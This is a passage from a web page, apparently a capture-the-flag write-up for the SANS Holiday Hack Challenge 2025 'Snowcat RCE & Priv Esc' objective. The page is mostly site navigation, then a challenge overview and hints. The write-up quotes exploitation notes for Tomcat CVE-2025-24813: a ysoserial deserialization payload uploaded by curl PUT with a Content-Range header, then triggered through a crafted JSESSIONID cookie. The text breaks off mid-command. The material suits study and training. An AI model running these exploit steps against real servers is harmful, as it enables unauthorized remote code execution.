
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
        <meta name="author" content="Michelle "Aeronique" Duell">
      
      
        <link rel="canonical" href="https://hhc2025.aerobytes.io/objectives/o21/">
      
      
        <link rel="prev" href="../o20/">
      
      
        <link rel="next" href="../o22/">
      
      
        
      
      
      <link rel="icon" href="../../img/misc/favicon.ico">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
    
    
      
        <title>Snowcat RCE & Priv Esc - SANS Holiday Hack Challenge 2025 Write-Up</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../css/extra.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="light-blue">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#overview" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="SANS Holiday Hack Challenge 2025 Write-Up" class="md-header__button md-logo" aria-label="SANS Holiday Hack Challenge 2025 Write-Up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M403 211.7c32.2-24.9 53-63.9 53-107.7 0-75.1-60.9-136-136-136S184 28.9 184 104c0 43.9 20.8 82.9 53 107.7-32.2 16.3-59 41.8-76.8 73.1L112 264.2V224c0-13.3-10.7-24-24-24s-24 10.7-24 24v19.6l-22.5-9.7c-12.2-5.2-26.3.4-31.5 12.6s.4 26.3 12.6 31.5c36.1 15.5 75.9 32.5 119.4 51.2-3.9 14.9-6 30.6-6 46.7 0 70 39.1 130.8 96.6 161.9 7.9 4.3 16.9 6.1 25.9 6.1h123c9 0 18-1.8 25.9-6.1 57.5-31.1 96.6-92 96.6-161.9 0-16.2-2.1-31.8-6-46.7 43.5-18.7 83.4-35.7 119.4-51.2 12.2-5.2 17.8-19.3 12.6-31.5s-19.3-17.8-31.5-12.6l-22.5 9.7V224c0-13.3-10.7-24-24-24s-24 10.7-24 24v40.2l-48.2 20.6c-17.9-31.3-44.6-56.8-76.8-73.1M296 416a24 24 0 1 1 48 0 24 24 0 1 1-48 0m24-120a24 24 0 1 1 0 48 24 24 0 1 1 0-48M248 80a24 24 0 1 1 48 0 24 24 0 1 1-48 0m120-24a24 24 0 1 1 0 48 24 24 0 1 1 0-48m-75.8 103.3c-2.7-4.8-4.2-10.2-4.2-15.7 0-17.5 14.2-31.6 31.6-31.6h.8c17.5 0 31.6 14.2 31.6 31.6 0 5.5-1.4 10.9-4.2 15.7L327 195.8c-3.1 5.4-10.8 5.4-13.9 0l-20.9-36.6z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            SANS Holiday Hack Challenge 2025 Write-Up
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Snowcat RCE & Priv Esc
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="light-blue"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



  

<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="SANS Holiday Hack Challenge 2025 Write-Up" class="md-nav__button md-logo" aria-label="SANS Holiday Hack Challenge 2025 Write-Up" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M403 211.7c32.2-24.9 53-63.9 53-107.7 0-75.1-60.9-136-136-136S184 28.9 184 104c0 43.9 20.8 82.9 53 107.7-32.2 16.3-59 41.8-76.8 73.1L112 264.2V224c0-13.3-10.7-24-24-24s-24 10.7-24 24v19.6l-22.5-9.7c-12.2-5.2-26.3.4-31.5 12.6s.4 26.3 12.6 31.5c36.1 15.5 75.9 32.5 119.4 51.2-3.9 14.9-6 30.6-6 46.7 0 70 39.1 130.8 96.6 161.9 7.9 4.3 16.9 6.1 25.9 6.1h123c9 0 18-1.8 25.9-6.1 57.5-31.1 96.6-92 96.6-161.9 0-16.2-2.1-31.8-6-46.7 43.5-18.7 83.4-35.7 119.4-51.2 12.2-5.2 17.8-19.3 12.6-31.5s-19.3-17.8-31.5-12.6l-22.5 9.7V224c0-13.3-10.7-24-24-24s-24 10.7-24 24v40.2l-48.2 20.6c-17.9-31.3-44.6-56.8-76.8-73.1M296 416a24 24 0 1 1 48 0 24 24 0 1 1-48 0m24-120a24 24 0 1 1 0 48 24 24 0 1 1 0-48M248 80a24 24 0 1 1 48 0 24 24 0 1 1-48 0m120-24a24 24 0 1 1 0 48 24 24 0 1 1 0-48m-75.8 103.3c-2.7-4.8-4.2-10.2-4.2-15.7 0-17.5 14.2-31.6 31.6-31.6h.8c17.5 0 31.6 14.2 31.6 31.6 0 5.5-1.4 10.9-4.2 15.7L327 195.8c-3.1 5.4-10.8 5.4-13.9 0l-20.9-36.6z"/></svg>

    </a>
    SANS Holiday Hack Challenge 2025 Write-Up
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Welcome
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    Objectives
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Objectives
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Orientation
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_1">
            <span class="md-nav__icon md-icon"></span>
            
  
    Orientation
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Holiday Hack Orientation
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Act 1
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    Act 1
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o2/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    It's All About Defang
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o3/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Neighborhood Watch Bypass
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o4/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Santa's Gift-Tracking Service Port Mystery
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o5/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Visual Networking Thinger
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o6/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Visual Firewall Thinger
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o7/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Intro to Nmap
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o8/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Blob Storage Challenge in the Neighborhood
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o9/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Spare Key
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o10/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    The Open Door
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o11/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Owner
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Act 2
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Act 2
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o12/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Retro Recovery
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o13/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Mail Detective
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o14/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    IDORable Bistro
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o15/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Dosis Network Down
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o16/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Rogue Gnome Identity Provider
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o17/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Quantgnome Leap
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o18/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Going in Reverse
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" checked>
        
          
          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    Act 3
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    Act 3
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o19/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Gnome Tea
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o20/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Hack-a-Gnome
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    
  
    Snowcat RCE & Priv Esc
  

    
  </span>
  
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    
  
    Snowcat RCE & Priv Esc
  

    
  </span>
  
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#overview" class="md-nav__link">
    <span class="md-ellipsis">
      
        Overview
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hints" class="md-nav__link">
    <span class="md-ellipsis">
      
        Hints
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    <span class="md-ellipsis">
      
        Solution
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o22/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Schrödinger's Scope
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o23/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Find and Shutdown Frosty's Snowglobe Machine
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o24/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    On the Wire
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o25/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Free Ski
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
        
          
          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    The Final Showdown
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_5">
            <span class="md-nav__icon md-icon"></span>
            
  
    The Final Showdown
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../o26/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Snowblind Ambush
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
      
        
        
      
    
    
    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    
  
    Extras
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    Extras
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../gnomes/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Meet the Gnomes!
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../easter_eggs/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Easter Egg of DOOM!
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              
              <article class="md-content__inner md-typeset">
                
                  



  <h1>Snowcat RCE & Priv Esc</h1>

<h2 id="overview">Overview<a class="headerlink" href="#overview" title="Permanent link">⚓︎</a></h2>
<p><img alt="First screenshot" src="../../img/objectives/o21/map_o21.png" /></p>
<p><strong>Tom</strong>, in the <strong>hotel</strong>, found a wild Snowcat bug. Help him chase down the RCE! Recover and submit the API key not being used by snowcat.</p>
<p><img src="/img/objectives/o21/hi_tom.png" style="float: left; margin-right: 20px; margin-bottom: 10px; width: 150px;" alt="Tom"></p>
<div class="admonition quote">
<p class="admonition-title">Tom</p>
<p>Hi, I'm Tom! I've worked for Counter Hack since its founding in 2010.</p>
<p>I love all things testing and QA, maintaining systems, logistics, and helping our customers have the best possible experience.</p>
<p>Outside of work, you'll find me at my local community theater producing shows, helping with sound or video, or just hanging around.</p>
<p>Learn more about my background at <a href="https://tomhessman.com/">TomHessman.com</a>!</p>
</div>
<div style="clear: both;"></div>

<div class="admonition quote">
<p class="admonition-title">Tom</p>
<p>We've lost access to the neighborhood weather monitoring station. There are a couple of vulnerabilities in the snowcat and weather monitoring services that we haven't gotten around to fixing. Can you help me exploit the vulnerabilities and retrieve the other application's authorization key? Enter the other application's authorization key into the badge.</p>
</div>
<h2 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">⚓︎</a></h2>
<details class="example">
<summary>Snowcat (1)</summary>
<p>Snowcat is closely related to Tomcat. Maybe the recent Tomcat Remote Code Execution vulnerability (CVE-2025-24813) will work here.</p>
</details>
<details class="example">
<summary>Snowcat (2)</summary>
<p>Maybe we can inject commands into the calls to the temperature, humidity, and pressure monitoring services.</p>
</details>
<details class="example">
<summary>Snowcat (3)</summary>
<p>If you're feeling adventurous, maybe you can become root to figure out more about the attacker's plans.</p>
</details>
<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
<h3 id="surveying-the-snowcats-den">Surveying the Snowcat's Den<a class="headerlink" href="#surveying-the-snowcats-den" title="Permanent link">⚓︎</a></h3>
<p>Time to explore what Tom's left for us! We fire up our terminal and... ho ho ho, what do we have here?</p>
<p><img alt="First screenshot" src="../../img/objectives/o21/s1.png" />
<em>fun fact: I just found that I can put emojis on my screenshots!</em></p>
<p>Tom's left us a proper exploitation starter kit! We've got an exploit script for <code>CVE-2025-24813</code>, the legendary <code>ysoserial</code> Java deserialization tool (every pentester's favorite stocking stuffer), some JSP files, and helpful notes. Like any good present unwrapping session, we'll start with the notes!</p>
<details class="example">
<summary>notes.md - Exploitation Instructions</summary>
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="c1"># Remote Code Execution exploiting RCE-2025-24813</span>
<span class="w">    </span>Snowcat<span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span>webserver<span class="w"> </span>adapted<span class="w"> </span>to<span class="w"> </span>life<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>arctic.
<span class="w">    </span>Can<span class="w"> </span>you<span class="w"> </span><span class="nb">help</span><span class="w"> </span>me<span class="w"> </span>check<span class="w"> </span>to<span class="w"> </span>see<span class="w"> </span><span class="k">if</span><span class="w"> </span>Snowcat<span class="w"> </span>is<span class="w"> </span>vulnerable<span class="w"> </span>to<span class="w"> </span>RCE-2025-24813<span class="w"> </span>like<span class="w"> </span>its<span class="w"> </span>cousin<span class="w"> </span>Tomcat?
<span class="w">    </span><span class="c1">## Display ysoserial help, lists payloads, and their dependencies:</span>
<span class="w">      </span>java<span class="w"> </span>-jar<span class="w"> </span>ysoserial.jar

<span class="w">    </span><span class="c1">## Identify what libraries are used by the Neighborhood Weather Monitoring system</span>
<span class="w">    </span><span class="c1">## Use ysoserial to generate a payload</span>
<span class="w">    </span>Store<span class="w"> </span>payload<span class="w"> </span><span class="k">in</span><span class="w"> </span>file<span class="w"> </span>named<span class="w"> </span>payload.bin
<span class="w">    </span><span class="c1">## Attempt to exploit RCE-2025-24813 to execute the payload</span>
<span class="w">    </span><span class="nb">export</span><span class="w"> </span><span class="nv">HOST</span><span class="o">=</span>TODO_INSERT_HOST
<span class="w">    </span><span class="nb">export</span><span class="w"> </span><span class="nv">PORT</span><span class="o">=</span>TODO_INSERT_PORT
<span class="w">    </span><span class="nb">export</span><span class="w"> </span><span class="nv">SESSION_ID</span><span class="o">=</span>TODO_INSERT_SESSION_ID
<span class="w">    </span>curl<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span><span class="se">\</span>
<span class="w">      </span>-H<span class="w"> </span><span class="s2">&quot;Host: </span><span class="si">${</span><span class="nv">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">PORT</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">      </span>-H<span class="w"> </span><span class="s2">&quot;Content-Length: </span><span class="k">$(</span>wc<span class="w"> </span>-c<span class="w"> </span>&lt;<span class="w"> </span>payload.bin<span class="k">)</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">      </span>-H<span class="w"> </span><span class="s2">&quot;Content-Range: bytes 0-</span><span class="k">$(($(</span>wc<span class="w"> </span>-c<span class="w"> </span>&lt;<span class="w"> </span>payload.bin<span class="k">)</span><span class="o">-</span><span class="m">1</span><span class="k">))</span><span class="s2">/</span><span class="k">$(</span>wc<span class="w"> </span>-c<span class="w"> </span>&lt;<span class="w"> </span>payload.bin<span class="k">)</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">      </span>--data-binary<span class="w"> </span>@payload.bin<span class="w"> </span><span class="se">\</span>
<span class="w">      </span><span class="s2">&quot;http://</span><span class="si">${</span><span class="nv">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">PORT</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">SESSION_ID</span><span class="si">}</span><span class="s2">/session&quot;</span>
<span class="w">    </span>curl<span class="w"> </span>-X<span class="w"> </span>GET<span class="w"> </span><span class="se">\</span>
<span class="w">      </span>-H<span class="w"> </span><span class="s2">&quot;Host: </span><span class="si">${</span><span class="nv">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">PORT</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
<span class="w">      </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: JSESSIONID=.</span><span class="si">${</span><span class="nv">SESSION_ID</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
